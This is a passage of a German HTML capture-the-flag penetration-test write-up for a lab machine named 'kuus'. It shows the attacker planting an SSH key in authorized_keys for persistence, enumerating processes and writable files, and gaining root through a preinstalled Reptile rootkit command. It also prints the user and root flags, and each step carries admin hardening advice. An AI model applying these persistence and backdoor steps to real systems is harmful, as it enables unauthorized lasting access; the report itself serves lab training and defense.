+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `user.txt` mit `cat user.txt`. Untersuchen Sie die anderen Dateien auf interessante Informationen. Richten Sie optional SSH-Zugriff für Persistenz ein.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Home-Verzeichnisse und sensible Dateien angemessene Berechtigungen haben (`chmod 700` für Home, `chmod 600` für private Dateien).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Um einen stabileren und persistenteren Zugriff als `mister_b` zu erhalten, wird ein SSH-Schlüsselpaar verwendet. Der öffentliche Schlüssel des Angreifers wird zur `authorized_keys`-Datei auf dem Zielsystem hinzugefügt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mister_b@kuus:~$ <span class="command">mkdir .ssh</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `mkdir .ssh` erstellt das Verzeichnis `.ssh` im Home-Verzeichnis von `mister_b`. Dieses Verzeichnis wird standardmäßig von SSH verwendet, um Konfigurationsdateien und autorisierte Schlüssel zu speichern.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt zur Vorbereitung der SSH-Schlüsselauthentifizierung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Berechtigungen für das `.ssh`-Verzeichnis korrekt gesetzt werden (`chmod 700`), obwohl es hier nicht explizit gemacht wird.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie die Erstellung von `.ssh`-Verzeichnissen in Benutzer-Home-Verzeichnissen. Stellen Sie sicher, dass die Serverkonfiguration (`sshd_config`) die Verwendung von Schlüsselauthentifizierung wie gewünscht erlaubt oder einschränkt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">mister_b@kuus:~$ <span class="command">cd .ssh/</span></div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechsel in das neu erstellte `.ssh`-Verzeichnis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardnavigation.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Original, aber Kontext ist mister_b@kuus:~/.ssh$ -->
+                    <pre><span class="prompt">mister_b@kuus:~/.ssh$</span> <span class="command">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfSQAyP3WCvqy4VJE=' > authorized_keys</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `echo`-Befehl schreibt den öffentlichen SSH-Schlüssel des Angreifers (hier stark gekürzt: `ssh-rsa AAAAB...`) in die Datei `authorized_keys` im `.ssh`-Verzeichnis. Wenn sich der Angreifer nun per SSH mit dem passenden privaten Schlüssel verbindet, wird der SSH-Server auf dem Zielsystem den öffentlichen Schlüssel in dieser Datei finden und den Login ohne Passwort erlauben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies etabliert einen persistenten SSH-Zugang für den Angreifer als Benutzer `mister_b`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die `authorized_keys`-Datei die korrekten Berechtigungen hat (`chmod 600`). Versuchen Sie nun, sich per SSH von Ihrer Maschine aus zu verbinden.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an `authorized_keys`-Dateien. Verwenden Sie zentrale Verwaltungstools für SSH-Schlüssel. Erwägen Sie die Deaktivierung der reinen Schlüsselauthentifizierung, wenn sie nicht benötigt wird, oder erzwingen Sie Passphrasen für Schlüssel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh mister_b@fuck.hmv</span></div>
+                    <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">[Passphrase eingegeben - nicht sichtbar]</span>
+Linux kuus 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="prompt">mister_b@kuus:~$</span> </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer verbindet sich von seiner lokalen Maschine (`root@cyber`) per SSH als Benutzer `mister_b` zum Zielsystem. Der Hostname `fuck.hmv` wird verwendet, was darauf hindeutet, dass der Angreifer einen Eintrag in seiner lokalen `/etc/hosts`-Datei erstellt hat, der diesen Namen auf die IP `192.168.2.119` abbildet. Der SSH-Client verwendet den privaten Schlüssel `/root/.ssh/id_rsa`, für den eine Passphrase erforderlich ist. Nach Eingabe der Passphrase wird die Verbindung erfolgreich hergestellt, wie das Login-Banner und der Prompt `mister_b@kuus:~$` zeigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Zugang wurde erfolgreich eingerichtet und getestet. Dies bietet eine stabilere und interaktivere Shell als die vorherige Netcat-Reverse-Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese SSH-Verbindung für die weiteren Schritte. Schließen Sie die alte Netcat-Verbindung, um unnötige Verbindungen zu vermeiden.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins (`/var/log/auth.log` oder äquivalent). Verwenden Sie Intrusion-Detection-Systeme, um ungewöhnliche Login-Muster zu erkennen. Erwägen Sie Zwei-Faktor-Authentifizierung für SSH.</p>
+
+            <h3>User Flag</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">mister_b@kuus:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">Ciphura</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `mister_b` wird nun der Inhalt der Datei `user.txt` im Home-Verzeichnis ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag lautet `<span class="password">Ciphura</span>`. Ein wichtiges Etappenziel ist erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flag. Konzentrieren Sie sich nun auf die Eskalation zu Root-Rechten.<br/><strong>Empfehlung (Admin):</strong> Flags sind typisch für CTF-Boxen. In realen Umgebungen sollten solche Dateien nicht existieren. Die zugrundeliegenden Schwachstellen, die den Zugriff ermöglichten, müssen behoben werden.</p>
+
+            <h3>Root Privilege Escalation Enumeration</h3>
+            <p class="analysis"><strong>Analyse:</strong> Nach Erlangung des User-Zugriffs beginnt die Suche nach Wegen, um Root-Rechte zu erlangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">mister_b@kuus:~$ <span class="command">ps aux | grep root</span></div>
+                     <pre>
+root         1  0.0  0.3 103804  9944 ?        Ss   14:57   0:00 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    14:57   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        I<   14:57   0:00 [rcu_gp]
+root         4  0.0  0.0      0     0 ?        I<   14:57   0:00 [rcu_par_gp]
+root         6  0.0  0.0      0     0 ?        I<   14:57   0:00 [kworker/0:0H-kblockd]
+root         8  0.0  0.0      0     0 ?        I<   14:57   0:00 [mm_percpu_wq]
+root         9  0.0  0.0      0     0 ?        S    14:57   0:01 [ksoftirqd/0]
+root        10  0.0  0.0      0     0 ?        I    14:57   0:00 [rcu_sched]
+root        11  0.0  0.0      0     0 ?        I    14:57   0:00 [rcu_bh]
+root        12  0.0  0.0      0     0 ?        S    14:57   0:00 [migration/0]
+root        14  0.0  0.0      0     0 ?        S    14:57   0:00 [cpuhp/0]
+root        15  0.0  0.0      0     0 ?        S    14:57   0:00 [kdevtmpfs]
+root        16  0.0  0.0      0     0 ?        I<   14:57   0:00 [netns]
+root        17  0.0  0.0      0     0 ?        S    14:57   0:00 [kauditd]
+root        18  0.0  0.0      0     0 ?        S    14:57   0:00 [khungtaskd]
+root        19  0.0  0.0      0     0 ?        S    14:57   0:00 [oom_reaper]
+root        20  0.0  0.0      0     0 ?        I<   14:57   0:00 [writeback]
+root        21  0.0  0.0      0     0 ?        S    14:57   0:00 [kcompactd0]
+root        22  0.0  0.0      0     0 ?        SN   14:57   0:00 [ksmd]
+root        23  0.0  0.0      0     0 ?        SN   14:57   0:00 [khugepaged]
+root        24  0.0  0.0      0     0 ?        I<   14:57   0:00 [crypto]
+root        25  0.0  0.0      0     0 ?        I<   14:57   0:00 [kintegrityd]
+root        26  0.0  0.0      0     0 ?        I<   14:57   0:00 [kblockd]
+root        27  0.0  0.0      0     0 ?        I<   14:57   0:00 [edac-poller]
+root        28  0.0  0.0      0     0 ?        I<   14:57   0:00 [devfreq_wq]
+root        29  0.0  0.0      0     0 ?        S    14:57   0:00 [watchdogd]
+root        30  0.0  0.0      0     0 ?        S    14:57   0:00 [kswapd0]
+root        48  0.0  0.0      0     0 ?        I<   14:57   0:00 [kthrotld]
+root        49  0.0  0.0      0     0 ?        I<   14:57   0:00 [ipv6_addrconf]
+root        50  0.0  0.0      0     0 ?        I    14:57   0:00 [kworker/u2:1-events_unbound]
+root        59  0.0  0.0      0     0 ?        I<   14:57   0:00 [kstrp]
+root       108  0.0  0.0      0     0 ?        I<   14:57   0:00 [ata_sff]
+root       110  0.0  0.0      0     0 ?        S    14:57   0:00 [scsi_eh_0]
+root       112  0.0  0.0      0     0 ?        I<   14:57   0:00 [scsi_tmf_0]
+root       113  0.0  0.0      0     0 ?        S    14:57   0:00 [scsi_eh_1]
+root       115  0.0  0.0      0     0 ?        S    14:57   0:00 [scsi_eh_2]
+root       116  0.0  0.0      0     0 ?        I<   14:57   0:00 [scsi_tmf_1]
+root       118  0.0  0.0      0     0 ?        I<   14:57   0:00 [scsi_tmf_2]
+root       119  0.0  0.0      0     0 ?        I    14:57   0:00 [kworker/u2:2-events_unbound]
+root       159  0.0  0.0      0     0 ?        I<   14:57   0:00 [kworker/0:1H-kblockd]
+root       190  0.0  0.0      0     0 ?        I<   14:57   0:00 [kworker/u3:0]
+root       192  0.0  0.0      0     0 ?        S    14:57   0:00 [jbd2/sda1-8]
+root       193  0.0  0.0      0     0 ?        I<   14:57   0:00 [ext4-rsv-conver]
+root       222  0.0  0.2  25096  7868 ?        Ss   14:57   0:00 /lib/systemd/systemd-journald
+root       248  0.0  0.1  22484  5392 ?        Ss   14:57   0:00 /lib/systemd/systemd-udevd
+root       310  0.0  0.0      0     0 ?        I<   14:57   0:00 [ttm_swap]
+root       311  0.0  0.0      0     0 ?        S    14:57   0:00 [irq/18-vmwgfx]
+root       340  0.0  0.1   9488  5596 ?        Ss   14:57   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
+root       379  0.0  0.0   8504  2796 ?        Ss   14:57   0:00 /usr/sbin/cron -f
+root       381  0.0  0.2 225824  5844 ?        Ssl  14:57   0:00 /usr/sbin/rsyslogd -n -iNNE
+root       382  0.0  0.2  19520  7268 ?        Ss   14:57   0:00 /lib/systemd/systemd-logind
+root       402  0.0  0.0   5612  1668 tty1     Ss+  14:57   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       433  0.0  0.2  15852  7116 ?        Ss   14:57   0:00 /usr/sbin/sshd -D
+root       475  0.0  0.6 196784 19620 ?        Ss   14:57   0:00 /usr/sbin/apache2 -k start
+root       736  0.0  0.0      0     0 ?        I    15:07   0:00 [kworker/0:1-events]
+root       976  0.0  0.0      0     0 ?        I    15:33   0:00 [kworker/0:0-ata_sff]
+root      1000  0.0  0.2  16904  8280 ?        Ss   15:38   0:00 <span class="command">sshd: mister_b [priv]</span>
+root      1024  0.0  0.0      0     0 ?        I    15:38   0:00 [kworker/0:2-mm_percpu_wq]
+mister_b  1090  0.0  0.0   6076   824 pts/2    S+   15:41   0:00 grep root
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `ps aux | grep root` listet alle laufenden Prozesse (`ps aux`) auf und filtert (`grep`) nach Zeilen, die "root" enthalten. Dies zeigt alle Prozesse, die als Benutzer `root` laufen, sowie möglicherweise andere Prozesse, die "root" im Namen oder in den Argumenten haben. Die Liste zeigt viele Standard-Systemprozesse und Kernel-Threads, die als `root` laufen (init, kthreadd, systemd-Dienste, sshd, cron, etc.). Es ist auch der `sshd: mister_b [priv]` Prozess zu sehen, der zur SSH-Verbindung des Angreifers gehört.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Ausgabe ist typisch für ein Linux-System. Sie zeigt keine unmittelbar offensichtlichen, ungewöhnlichen oder ausnutzbaren Root-Prozesse auf den ersten Blick. Es ist eine grundlegende Enumerationstechnik, um sich einen Überblick über die Systemaktivitäten zu verschaffen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie gezielter nach weniger verbreiteten oder benutzerdefinierten Diensten, die als Root laufen. Analysieren Sie SUID/SGID-Binaries (`find / -type f -perm -04000 -ls 2>/dev/null`), Cron-Jobs (`cat /etc/crontab` und Dateien in `/etc/cron.*`), und überprüfen Sie erneut die `sudo -l`-Ausgabe (obwohl `mister_b` wahrscheinlich keine sudo-Rechte hat).<br/><strong>Empfehlung (Admin):</strong> Regelmäßige Überprüfung der laufenden Prozesse und Dienste. Deaktivieren oder entfernen Sie unnötige Dienste. Verwenden Sie Tools wie `chkrootkit` oder `rkhunter`, um nach bekannten Rootkits oder verdächtigen Prozessen zu suchen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">mister_b@kuus:~$ <span class="command">find / -writable ! -user root -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null</span></div>
+                     <pre>
+<span class="command">-rw-r--r-- 1 mister_b mister_b 553 Nov 16 15:36 /opt/games/.ssh/authorized_keys</span>
+<span class="command">-rw-r--r-- 1 mister_b mister_b 196 Nov 16 15:30 /opt/games/random.pyc</span>
+<span class="command">-rw-r--r-- 1 mister_b mister_b 1139 May  2  2021 /opt/games/game.py</span>
+<span class="command">-rwxr-x--- 1 mister_b mister_b 3554 May  2  2021 /home/mister_b/.bashrc</span>
+<span class="command">-rw------- 1 mister_b mister_b 32 May  2  2021 /home/mister_b/.gnupg/pubring.kbx</span>
+<span class="command">-rw------- 1 mister_b mister_b 1200 May  2  2021 /home/mister_b/.gnupg/trustdb.gpg</span>
+<span class="command">-rwxr-x--- 1 mister_b mister_b 807 May  2  2021 /home/mister_b/.profile</span>
+<span class="command">-rw-r--r-- 1 mister_b mister_b 553 Nov 16 15:37 /home/mister_b/.ssh/authorized_keys</span>
+<span class="command">-rwxr-x--- 1 mister_b mister_b 220 May  2  2021 /home/mister_b/.bash_logout</span>
+<span class="command">-rw------- 1 mister_b mister_b 8 May  2  2021 /home/mister_b/user.txt</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser `find`-Befehl sucht nach Dateien (`-type f`) im gesamten Dateisystem (`/`), die für den aktuellen Benutzer (`mister_b`) schreibbar sind (`-writable`), aber nicht dem Benutzer `root` gehören (`! -user root`). Die Pfade `/proc/*` und `/sys/*` werden ausgeschlossen, da sie virtuelle Dateisysteme sind und viele irrelevante Treffer liefern würden. Für jede gefundene Datei wird `ls -al` ausgeführt (`-exec ls -al {} \;`), um detaillierte Informationen anzuzeigen. Fehlermeldungen werden unterdrückt (`2>/dev/null`). Die Ausgabe zeigt hauptsächlich Dateien im Home-Verzeichnis von `mister_b` und im Verzeichnis `/opt/games` an, die `mister_b` gehören und für ihn schreibbar sind.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl ist nützlich, um potenziell interessante Dateien zu finden, die geändert werden können. In diesem Fall zeigt er jedoch keine offensichtlichen Dateien außerhalb der bereits bekannten Bereiche, die für eine Privilegienausweitung genutzt werden könnten (z.B. Konfigurationsdateien von Diensten, die als Root laufen).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Variieren Sie den `find`-Befehl, um nach anderen interessanten Mustern zu suchen, z.B. nach SUID-Dateien (`-perm -4000`), SGID-Dateien (`-perm -2000`), oder weltbeschreibbaren Dateien (`-perm -o+w`). Nutzen Sie automatisierte Enumeration-Skripte wie LinPEAS oder LinEnum.<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig Dateiberechtigungen im System. Dateien sollten nur die minimal notwendigen Berechtigungen haben. Achten Sie besonders auf schreibbare Dateien in Systemverzeichnissen oder Verzeichnissen von Diensten.</p>
+
+        </section>
+
+        <!-- Proof of Concept Abschnitt für Root -->
+        <section id="poc-root">
+            <h2>Proof of Concept: Root Exploit (Reptile Rootkit)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Bei der Untersuchung der `.bash_history` des `www-data`-Benutzers wurde ein Wechsel in ein verdächtiges Verzeichnis `/reptile` festgestellt. Dieses Verzeichnis und der darin enthaltene Befehl `reptile_cmd` scheinen Teil eines installierten Rootkits (Reptile) zu sein, das eine einfache Methode zur Erlangung von Root-Rechten bietet.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff als Benutzer `mister_b` (oder ein anderer Benutzer, der den Befehl ausführen kann), Existenz des `/reptile`-Verzeichnisses und des `reptile_cmd`-Befehls.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong> Der Exploit ist trivial, da das Rootkit bereits installiert zu sein scheint und eine direkte Funktion zur Privilegienerweiterung bietet.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">mister_b@kuus:/tmp$ <span class="command">/reptile/reptile_cmd root</span></div>
+                     <pre><span class="password">You got super powers!</span>
+
+<span class="prompt">root@kuus:/tmp#</span> </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `/reptile/reptile_cmd root` wird ausgeführt. Dies ist der spezifische Befehl des Reptile-Rootkits, um eine Root-Shell zu erhalten. Die Ausgabe "You got super powers!" und der geänderte Prompt `root@kuus:/tmp#` bestätigen, dass der Befehl erfolgreich war und nun Root-Rechte erlangt wurden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Fantastisch, der Root-Zugriff war erfolgreich! Nun haben wir unser Ziel erreicht.** Dies ist ein klassischer Fall von Ausnutzung einer bereits vorhandenen Backdoor oder eines Rootkits. Der Hinweis aus der `.bash_history` war hier der Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben nun Root-Zugriff. Holen Sie die Root-Flag. Untersuchen Sie das Rootkit (`/reptile`) genauer, um seine Funktionsweise und Persistenzmechanismen zu verstehen. Führen Sie eine vollständige Post-Exploitation-Enumeration durch.<br/><strong>Empfehlung (Admin):</strong> **Kritischer Sicherheitsvorfall!** Das System ist mit einem Rootkit kompromittiert. Das System muss sofort vom Netzwerk isoliert werden. Eine vollständige Neuinstallation von einem vertrauenswürdigen Medium ist dringend empfohlen, da ein Rootkit tiefgreifende und schwer zu entfernende Änderungen am System vorgenommen haben kann. Führen Sie eine forensische Analyse durch, um den ursprünglichen Infektionsvektor und das Ausmaß der Kompromittierung zu bestimmen. Entfernen Sie das `/reptile`-Verzeichnis und alle zugehörigen Komponenten.</p>
+
+            <h3>Root Flag</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@kuus:/tmp# <span class="command">cd /root</span></div>
+                     <pre><span class="prompt">root@kuus:/root#</span> </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechsel in das Home-Verzeichnis des Root-Benutzers.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardnavigation nach Erlangung von Root-Rechten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@kuus:/root# <span class="command">ls</span></div>
+                     <pre>Reptile  root.txt</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `ls` zeigt den Inhalt des Root-Home-Verzeichnisses. Es enthält ein Verzeichnis namens `Reptile` (vermutlich Konfiguration oder weitere Dateien des Rootkits) und die erwartete Datei `root.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag ist in Sicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie `root.txt`. Untersuchen Sie optional das `Reptile`-Verzeichnis.<br/><strong>Empfehlung (Admin):</strong> Nach der Neuinstallation sicherstellen, dass das Root-Home-Verzeichnis sauber ist und keine verdächtigen Dateien oder Verzeichnisse enthält.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@kuus:/root# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">Warulli</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `root.txt` wird ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag lautet `<span class="password">Warulli</span>`. Das Ziel des Penetrationstests ist erreicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Root-Flag. Erstellen Sie den Abschlussbericht.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie alle identifizierten Schwachstellen (Upload-Filter, Klartextpasswort, unsichere sudo-Regel, Rootkit-Präsenz) und implementieren Sie die empfohlenen Härtungsmaßnahmen.</p>
+        </section>
+
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">Ciphura</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">Warulli</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. November 2022</p>
+    </footer>
+</body>
+</html>
